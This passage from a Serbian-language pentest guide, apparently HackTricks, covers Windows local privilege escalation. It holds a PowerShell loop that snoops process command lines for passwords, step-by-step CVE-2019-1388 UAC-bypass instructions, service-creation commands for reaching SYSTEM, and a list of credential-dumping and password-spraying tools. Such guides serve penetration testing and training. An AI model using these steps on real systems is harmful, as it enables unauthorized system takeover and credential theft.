Takođe, sledeći alat omogućava **interceptovanje komunikacije imenovane cevi sa alatom poput burp-a:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **a ovaj alat omogućava listanje i pregled svih cevi radi pronalaženja priveska** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Razno

### **Pratite komandne linije za lozinke**

Kada dobijete shell kao korisnik, može se desiti da se izvršavaju zakazani zadaci ili drugi procesi koji **prosleđuju akreditive putem komandne linije**. Skripta ispod beleži komandne linije procesa svake dve sekunde i upoređuje trenutno stanje sa prethodnim stanjem, prikazujući sve razlike.

```powershell
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Krađa lozinki iz procesa

## Od korisnika sa niskim privilegijama do NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Ako imate pristup grafičkom interfejsu (putem konzole ili RDP-a) i UAC je omogućen, u nekim verzijama Microsoft Windows-a moguće je pokrenuti terminal ili bilo koji drugi proces kao "NT\AUTHORITY SYSTEM" sa korisnikom bez privilegija.

Ovo omogućava eskalaciju privilegija i zaobilaženje UAC-a istovremeno sa istom ranjivošću. Dodatno, nije potrebno instalirati ništa, a binarni fajl korišćen tokom procesa je potpisan i izdat od strane Microsoft-a.

Neke od pogođenih sistema su sledeće:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

Da biste iskoristili ovu ranjivost, potrebno je izvršiti sledeće korake:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

Imate sve potrebne datoteke i informacije u sledećem GitHub repozitorijumu:

https://github.com/jas502n/CVE-2019-1388

## Od Administrator Medium do High Integrity Level / UAC Bypass

Pročitajte ovo da **saznate više o Integrity Levels**:

{% content-ref url="integrity-levels.md" %}
[integrity-levels.md](integrity-levels.md)
{% endcontent-ref %}

Zatim **pročitajte ovo da saznate više o UAC i UAC bypass-ovima**:

{% content-ref url="../authentication-credentials-uac-and-efs/uac-user-account-control.md" %}
[uac-user-account-control.md](../authentication-credentials-uac-and-efs/uac-user-account-control.md)
{% endcontent-ref %}

## **Od High Integrity do System**

### **Novi servis**

Ako već radite u High Integrity procesu, **prelazak na SYSTEM** može biti jednostavan samo **kreiranjem i izvršavanjem novog servisa**:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

### Uvek instaliraj uzdignuto

Iz procesa visoke integriteta možete **pokušati da omogućite unose registra AlwaysInstallElevated** i **instalirate** obrnutu ljusku koristeći _**.msi**_ omotač.\
[Više informacija o uključenim ključevima registra i kako instalirati _.msi_ paket ovde.](./#alwaysinstallelevated)

### Visoko + SeImpersonate privilegije do System

**Možete** [**pronaći kod ovde**](seimpersonate-from-high-to-system.md)**.**

### Od SeDebug + SeImpersonate do punih Token privilegija

Ako imate te token privilegije (verovatno ćete ih pronaći u već postojećem procesu visoke integriteta), bićete u mogućnosti da **otvorite skoro svaki proces** (osim zaštićenih procesa) sa privilegijom SeDebug, **kopirate token** procesa, i kreirate **proizvoljan proces sa tim tokenom**.\
Korišćenjem ove tehnike obično je **izabran bilo koji proces koji se izvršava kao SYSTEM sa svim token privilegijama** (_da, možete pronaći SYSTEM procese bez svih token privilegija_).\
**Možete pronaći** [**primer koda koji izvršava predloženu tehniku ovde**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Imenovane cijevi**

Ova tehnika se koristi od strane meterpretera za eskalaciju u `getsystem`. Tehnika se sastoji od **kreiranja cijevi i zatim kreiranja/zloupotrebe servisa za pisanje na tu cijev**. Zatim, **server** koji je kreirao cijev koristeći privilegiju **`SeImpersonate`** će biti u mogućnosti da **impersonira token** klijenta cijevi (servis) i dobije SYSTEM privilegije.\
Ako želite da [**saznate više o imenovanim cijevima trebalo bi da pročitate ovo**](./#named-pipe-client-impersonation).\
Ako želite da pročitate primer [**kako preći sa visoke integriteta na System koristeći imenovane cijevi trebalo bi da pročitate ovo**](from-high-integrity-to-system-with-name-pipes.md).

### Dll preusmeravanje

Ako uspete da **preusmerite dll** koju **učitava** proces koji se izvršava kao **SYSTEM** bićete u mogućnosti da izvršite proizvoljan kod sa tim dozvolama. Stoga je Dll preusmeravanje takođe korisno za ovu vrstu eskalacije privilegija, i, štaviše, mnogo je **jednostavnije postići iz procesa visoke integriteta** jer će imati **dozvole za pisanje** u fasciklama koje se koriste za učitavanje dll-ova.\
**Možete** [**saznati više o Dll preusmeravanju ovde**](dll-hijacking/)**.**

### **Od Administratora ili Mrežne usluge do Systema**

{% embed url="https://github.com/sailay1996/RpcSsImpersonator" %}

### Od LOKALNE USLUGE ili MREŽNE USLUGE do punih privilegija

**Pročitajte:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Više pomoći

[Statični impacket binarni fajlovi](https://github.com/ropnop/impacket\_static\_binaries)

## Korisni alati

**Najbolji alat za traženje vektora eskalacije privilegija na Windowsu:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Proverite konfiguracije i osetljive fajlove (**[**proverite ovde**](https://github.com/carlospolop/hacktricks/blob/rs/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detektovano.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Proverite neke moguće konfiguracije i prikupite informacije (**[**proverite ovde**](https://github.com/carlospolop/hacktricks/blob/rs/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Proverite konfiguracije**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Izvlači informacije o sesijama sa PuTTY, WinSCP, SuperPuTTY, FileZilla, i RDP. Koristite -Thorough lokalno.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Izvlači kredencijale iz Menadžera kredencijala. Detektovano.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Prskajte prikupljene lozinke po domenu**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh je PowerShell ADIDNS/LLMNR/mDNS/NBNS spoofer i alat za man-in-the-middle.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Osnovna provera Windows enumeracije privilegija**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- Pretražite poznate ranjivosti eskalacije privilegija (ZASTARELO za Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Lokalne provere **(Potrebna su administratorska prava)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Pretražite poznate ranjivosti eskalacije privilegija (potrebno je kompajlirati korišćenjem VisualStudio) ([**prekompajlirano**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumeracija hosta tražeći konfiguracije (više alat za prikupljanje informacija nego za eskalaciju privilegija) (potrebno je kompajlirati) **(**[**prekompajlirano**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Izvlači kredencijale iz mnogih softvera (prekompajlirani exe na githubu)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Portovanje PowerUp-a u C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- Proverite konfiguracije (izvršni fajl prekompajliran na githubu). Nije preporučljivo. Ne radi dobro na Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Proverite moguće konfiguracije (exe iz pythona). Nije preporučljivo. Ne radi dobro na Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Alat kreiran na osnovu ovog posta (ne zahteva accesschk da bi pravilno radio, ali može ga koristiti).

**Lokalno**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Čita izlaz **systeminfo** i preporučuje funkcionalne eksploate (lokalni python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Čita izlaz **systeminfo** i preporučuje funkcionalne eksploate (lokalni python)

**Meterpreter**

_multi/recon/local\_exploit\_suggestor_

Morate kompajlirati projekat koristeći odgovarajuću verziju .NET-a ([vidi ovo](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Da biste videli instaliranu verziju .NET-a na ciljnom računaru možete uraditi:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## Bibliografija

* [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)\\
* [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)\\
* [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\\
* [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)\\
* [https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=\_8xJaaQlpBo)\\
* [https://sushant747.gitbooks.io/total-oscp-guide/privilege\_escalation\_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege\_escalation\_windows.html)\\
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)\\
* [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)\\
* [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)\\
* [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\\
* [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)\\
* [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\\
* [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\\
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Da li radite u **kompaniji za kibernetičku bezbednost**? Želite li da vidite svoju **kompaniju reklamiranu na HackTricks**? ili želite pristup **najnovijoj verziji PEASS ili preuzimanje HackTricks u PDF formatu**? Proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Pridružite se** [**💬**](https://emojipedia.org/speech-balloon/) **Discord grupi**]\(https://discord.gg/hRep4RUj7f) ili **telegram grupi** ili me **pratite** na **Twitteru** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova** [**hacktricks repozitorijumu**](https://github.com/carlospolop/hacktricks) **i** [**hacktricks-cloud repozitorijumu**](https://github.com/carlospolop/hacktricks-cloud).

</details>
